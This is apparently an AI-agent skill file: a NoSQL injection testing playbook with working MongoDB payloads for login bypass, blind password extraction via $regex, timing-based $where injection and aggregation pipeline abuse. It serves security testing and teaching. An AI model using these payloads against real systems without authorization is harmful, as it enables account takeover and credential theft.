---
name: nosql-injection
description: 1. CORE CONCEPT — OPERATOR INJECTION
when-to-use: >-
  NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse.
---

# SKILL: NoSQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: NoSQL injection is fundamentally different from SQL injection. Covers MongoDB operator injection, authentication bypass, blind extraction, aggregation pipeline injection, and Redis/CouchDB specific attacks. Very commonly missed by testers who only know SQLi patterns.

---

## 1. CORE CONCEPT — OPERATOR INJECTION

**SQL Injection** breaks out of string literals.  
**NoSQL Injection** injects **query operators** that change query logic.

MongoDB example — normal query:
```javascript
db.users.find({username: "alice", password: "secret"})
```

Injection via JSON operator:
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
→ Becomes: `find({username:"admin", password:{$gt:""}})` → password > "" → always true!

---

## 2. MONGODB — LOGIN BYPASS

### JSON Body Injection (API with JSON Content-Type)
```json
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### PHP `$_POST` Array Injection (URL-encoded form)
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### Ruby / Python `params` Array Injection
Same as PHP — use bracket notation to inject objects:
```
?username[%24ne]=invalid&password[%24ne]=invalid
```
`%24` = URL-encoded `$`

---

## 3. MONGODB OPERATORS FOR INJECTION

| Operator | Meaning | Use Case |
|---|---|---|
| `$ne` | not equal | `{"password": {"$ne": "x"}}` → always matches |
| `$gt` | greater than | `{"password": {"$gt": ""}}` → all non-empty passwords match |
| `$gte` | greater or equal | Similar to $gt |
| `$lt` | less than | `{"password": {"$lt": "~"}}` → all ASCII match |
| `$regex` | regex match | `{"username": {"$regex": "adm.*"}}` |
| `$where` | JS expression | MOST DANGEROUS — code execution |
| `$exists` | field exists | `{"admin": {"$exists": true}}` |
| `$in` | in array | `{"username": {"$in": ["admin","user"]}}` |

---

## 4. BLIND DATA EXTRACTION VIA $REGEX

Like binary search in SQLi, use `$regex` to extract field values character by character:

```json
// Does admin's password start with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}

// Does admin's password start with 'b'?
{"username": "admin", "password": {"$regex": "^b"}}

// Continue: narrow down each position
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
```

**Response difference**: successful login vs failed login = boolean oracle.

**Automate** with NoSQLMap or custom script with binary search on character set.

---

## 5. MONGODB $WHERE INJECTION (JS EXECUTION)

`$where` evaluates JavaScript in MongoDB context.  
**Can only use current document's fields** — not system access. But allows logic abuse:

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}

// Blind extraction via timing:
{"$where": "if(this.username=='admin'){sleep(5000);return true;}else{return false;}"}

// Regex via JS:
{"$where": "this.username.match(/^adm/) && true"}
```

**Limit**: `$where` doesn't give OS command execution — **server-side JS injection** (not to be confused with command injection).

---

## 6. AGGREGATION PIPELINE INJECTION

When user-controlled data enters `$match` or `$group` stages:

```javascript
// Vulnerable code:
db.collection.aggregate([
  {$match: {category: userInput}},  // userInput = {"$ne": null}
  ...
])
```

Inject operators to bypass:
```json
// Input as object:
{"$ne": null}  → matches all categories
{"$regex": ".*"}  → matches all
```

---

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
